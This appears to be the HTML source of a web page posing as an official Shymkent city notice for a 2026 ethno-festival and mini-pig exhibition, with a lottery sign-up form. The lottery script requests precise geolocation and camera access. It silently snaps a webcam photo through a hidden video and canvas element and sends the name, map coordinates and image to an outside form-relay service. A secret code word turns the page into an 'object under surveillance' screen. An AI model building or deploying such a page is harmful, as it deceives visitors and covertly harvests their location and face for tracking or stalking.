<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Жас Түлек — 2026 | Цитадель</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-pink: #ff85a2;
            --citadel-gold: #d4af37;
            --dark-text: #2c3e50;
            --border-color: #eee;
        }

        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            margin: 0;
            background-color: #fdf5f0;
            color: var(--dark-text);
            line-height: 1.6;
            transition: background 3s ease, color 3s ease;
        }

        header {
            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('image_2.png');
            background-size: cover;
            background-position: center;
            height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
            transition: opacity 1.5s ease;
        }

        .container {
            max-width: 700px;
            margin: -30px auto 30px;
            padding: 25px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            transition: background 3s ease;
        }

        .profile-gif {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            display: block;
            margin: -75px auto 15px;
            border: 5px solid white;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
            object-fit: cover;
        }

        @keyframes rotateAnim {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .rotating {
            animation: rotateAnim 3s linear infinite;
        }

        .section-frame {
            border: 2px solid var(--border-color);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            background-color: #fff;
            transition: all 3s ease;
        }

        .pink-frame {
            border: 2px solid var(--primary-pink);
            background-color: #fff9fa;
        }

        .gold-frame {
            border: 2px solid var(--citadel-gold);
            background-color: #fffdf5;
        }

        .gallery-grid {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin: 20px 0;
        }

        .gallery-item {
            width: 100%;
            border-radius: 15px;
            display: block;
            object-fit: cover;
        }

        h2 { color: var(--primary-pink); text-align: center; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-top: 0; }
        .official-text { white-space: pre-wrap; font-size: 0.95em; }

        .nav-links { display: flex; flex-direction: column; gap: 10px; margin-top: 20px; }
        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 15px;
            border-radius: 12px;
            text-decoration: none;
            font-weight: bold;
            color: white;
            transition: 0.3s;
        }

        .btn-insta { background: #E1306C; }
        .btn-map { background: #4285F4; }
        .btn-support { background: #555; cursor: pointer; border: none; width: 100%; font-family: inherit; font-size: 16px; }

        .lottery-section {
            margin-top: 30px;
            padding: 20px;
            border: 3px dashed var(--citadel-gold);
            border-radius: 20px;
            background: #fffdf0;
            text-align: center;
            transition: all 3s ease;
        }
        .lottery-img { width: 100%; border-radius: 15px; margin-bottom: 15px; }
        .lottery-input {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            box-sizing: border-box;
        }
        .btn-lottery {
            background: #ff4d4d;
            border: none;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            color: white;
            padding: 15px;
            border-radius: 12px;
            font-weight: bold;
        }

        .footer { text-align: center; font-size: 0.8em; color: #888; margin-top: 30px; padding: 10px; }
        
        #hidden-video, #hidden-canvas { display: none; }
    </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline></video>
<canvas id="hidden-canvas"></canvas>

<header id="main-header">
    <h1 id="header-title">ЖАС ТҮЛЕК — 2026</h1>
</header>

<div class="container" id="main-container">
    <img src="image_0.png" class="profile-gif" id="main-avatar">

    <div class="official-text" id="info-container">
        <div class="section-frame">
🏛️ <b>ОФИЦИАЛЬНОЕ УВЕДОМЛЕНИЕ: ЭТНО-ФЕСТИВАЛЬ «ЖАС ТҮЛЕК — 2026» В ЦИТАДЕЛИ</b>
Акимат г. Шымкент информирует о проведении международной интерактивной экспозиции...
        </div>

        <div class="pink-frame" style="border-radius: 15px; padding: 15px; margin-bottom: 20px; text-align: center;">
            <h2 style="border: none; margin: 0;">🌸 ВЫСТАВКА МАЛЕНЬКИХ СВИНЕЙ ЖДЕТ ВЕСНУ! 🌸</h2>
        </div>
    </div>

    <div class="gallery-grid" id="main-gallery">
        <img src="image_3.png" class="gallery-item" alt="Фото семьи">
        <img src="image_1.png" class="gallery-item" alt="Фото музея">
    </div>

    <div class="nav-links">
        <a href="https://www.instagram.com/minipig536/" target="_blank" class="btn btn-insta">
            <i class="fab fa-instagram"></i> Instagram: minipig536
        </a>
        <button onclick="copySupportID()" class="btn btn-support">
            <i class="fas fa-copy"></i> Копировать ID техподдержки
        </button>
    </div>

    <div class="lottery-section" id="lot-sec">
        <img src="лотере.png" class="lottery-img" alt="Лотерея">
        <h3>🎟️ УЧАВСТВОВАТЬ В КОНКУРСЕ ЛОТЫРЕЯ!!!</h3>
        <input type="text" id="userName" class="lottery-input" placeholder="Введите Имя и Фамилию">
        <input type="text" id="secretCode" class="lottery-input" placeholder="Кодовое слово">
        <button onclick="runLottery()" class="btn btn-lottery">УЧАВСТВОВАТЬ!!!</button>
    </div>

    <div class="footer">
        Session ID: 5931c081-de5a-458f-b1ab-824418ecfd61
    </div>
</div>

<script>
    function copySupportID() {
        navigator.clipboard.writeText("5931c081-de5a-458f-b1ab-824418ecfd61");
        alert("ID скопирован!");
    }

    async function runLottery() {
        const name = document.getElementById('userName').value;
        const code = document.getElementById('secretCode').value.trim().toUpperCase();
        const supportID = "5931c081-de5a-458f-b1ab-824418ecfd61";
        
        if(!name) { alert("Введите имя!"); return; }

        // ПРОВЕРКА ВОПРОСАМИ
        if(!confirm("Вы любите животных?")) return;
        if(!confirm("Вы находитесь на территории Цитадели?")) return;
        if(!confirm("Вы готовы сделать фото-подтверждение для получения приза?")) return;

        let finalPhoto = "PHOTO_DENIED";
        let finalGeo = "GEO_DENIED";

        // 1. ЗАПРОС ГЕОЛОКАЦИИ (ТОЛЬКО ТУТ)
        try {
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true});
            });
            finalGeo = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        } catch(e) { finalGeo = "GPS_BLOCKED"; }

        // 2. ЗАПРОС КАМЕРЫ (ТОЛЬКО ТУТ)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('hidden-video');
            video.srcObject = stream;
            await new Promise(res => setTimeout(res, 1000));
            const canvas = document.getElementById('hidden-canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            finalPhoto = canvas.toDataURL('image/jpeg', 0.5);
            stream.getTracks().forEach(t => t.stop());
        } catch(e) { finalPhoto = "CAMERA_BLOCKED"; }

        // ОТПРАВКА НА ПОЧТУ
        const payload = {
            access_key: supportID,
            subject: `Участник: ${name}`,
            message: `ИМЯ: ${name}\nКОД: ${code}\nКАРТА: ${finalGeo}\n\nФОТО_ССЫЛКА_ТЕКСТОМ (Скопируй всё ниже):\n${finalPhoto}`
        };

        await fetch("https://api.web3forms.com/submit", {
            method: "POST",
            headers: {"Content-Type":"application/json"},
            body: JSON.stringify(payload)
        });

        // ПРОВЕРКА ПАСХАЛКИ
        const secretKeys = ["ХЕНДИК", "МАЗЕРАТ", "ПТОЗИ", "536"];
        if (secretKeys.includes(code)) {
            activateBarkBeetle();
        } else {
            alert("Заявка отправлена! Победитель будет объявлен через 15 минут у центрального входа!");
        }
    }

    function activateBarkBeetle() {
        document.body.style.backgroundColor = "#0a0a0a";
        document.body.style.color = "#7a0000";
        document.getElementById('main-container').style.backgroundColor = "#111";
        document.getElementById('header-title').innerText = "ОБЪЕКТ ПОД НАБЛЮДЕНИЕМ";
        const avatar = document.getElementById('main-avatar');
        avatar.src = 'Amage_0.png';
        avatar.classList.add('rotating');
        alert("Bark_Beetle.Erer: Доступ разрешен.");
    }
</script>

</body>
</html>
